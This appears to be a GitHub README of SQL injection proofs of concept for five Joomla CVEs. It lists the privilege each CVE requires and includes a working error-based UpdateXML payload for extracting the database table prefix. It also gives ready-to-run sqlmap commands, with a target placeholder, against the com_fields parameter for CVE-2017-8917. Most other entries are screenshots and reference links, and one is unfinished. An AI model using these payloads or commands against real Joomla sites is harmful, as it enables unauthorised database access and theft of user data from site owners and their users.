# Joomla-SQLinjection PoC

1. CVE-2020-10243

2. CVE-2019-19846

3. CVE-2018-8045

4. CVE-2018-6376

5. CVE-2017-8917

# Payload to detect prefix table
## Step 1: Get hexa value
*UpdateXML(2, concat(0x3a,(SELECT HEX(MID(TABLE_NAME,1,16)) FROM information_schema.tables WHERE TABLE_NAME LIKE 0x257573657273 LIMIT 1,1), 0x3a), 1)*
## Step 2: Convert hexa to ASCII
+) Linux command: echo "hexa value" | xxd -r -p

+) Link: https://www.rapidtables.com/convert/number/hex-to-ascii.html

# 5. CVE-2017-8917
### User requirement: None
## Detecting:
![image](https://user-images.githubusercontent.com/24661746/77494259-ddd35680-6e77-11ea-8331-106c89b48f7c.png)
## Sqlmap:
sqlmap -u "[your taget]/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" --dbms=mysql --technique=E --dbs
## Example
sqlmap -u "http://192.168.119.128/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" --dbms=mysql --technique=E --dbs
# 4. CVE-2018-6376
### User requirement: Manager (Lowest level)
## Detecting:
![image](https://user-images.githubusercontent.com/24661746/77607304-73d8b100-6f4c-11ea-9c6b-72a56c55efda.png)

### Second-url:

![image](https://user-images.githubusercontent.com/24661746/77607359-a7b3d680-6f4c-11ea-9f66-78b24b5ee895.png)

## 3. CVE-2018-8045
### User requirement: Administrator
## Detecting:
![image](https://user-images.githubusercontent.com/24661746/77608547-25c5ac80-6f50-11ea-9495-b13b00448d1c.png)
## 2. CVE-2019-19846
### User requirement: Super Users
## Detecting:
...Update later-...
## 1. CVE-2020-10243
### User requirement: Administrator
## Detecting:
![image](https://user-images.githubusercontent.com/24661746/78954200-8d115e00-7b05-11ea-8cd1-0d605fff4101.png)

### Second-url:
![image](https://user-images.githubusercontent.com/24661746/78954286-d2ce2680-7b05-11ea-9ffb-ec1263618056.png)

Reference:
1. https://github.com/HoangKien1020/CVE-2020-10243
2. https://xz.aliyun.com/t/6990
3. https://github.com/luckybool1020/CVE-2018-8045
4. https://www.notsosecure.com/analyzing-cve-2018-6376/
5. https://github.com/gottburgm/Exploits/tree/master/CVE-2017-8917
